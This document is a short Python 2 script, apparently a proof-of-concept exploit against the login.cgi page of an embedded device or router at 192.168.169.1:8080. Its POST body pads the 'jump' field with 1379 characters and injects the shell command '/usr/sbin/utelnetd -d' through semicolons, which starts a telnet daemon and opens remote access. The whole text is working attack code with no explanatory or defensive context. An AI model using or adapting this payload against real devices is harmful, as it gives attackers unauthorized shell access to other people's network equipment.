import httplib
 
headers = {}
body= “GO=&jump=”+ “a”*1379 +”%3b”+ “/usr/sbin/utelnetd -d” +”%3b&pws=\n\n”
conn = httplib.HTTPConnection(“192.168.169.1″,8080)
conn.request(“POST”, “/login.cgi”, body, headers)
response = conn.getresponse()
data = response.read()
print data
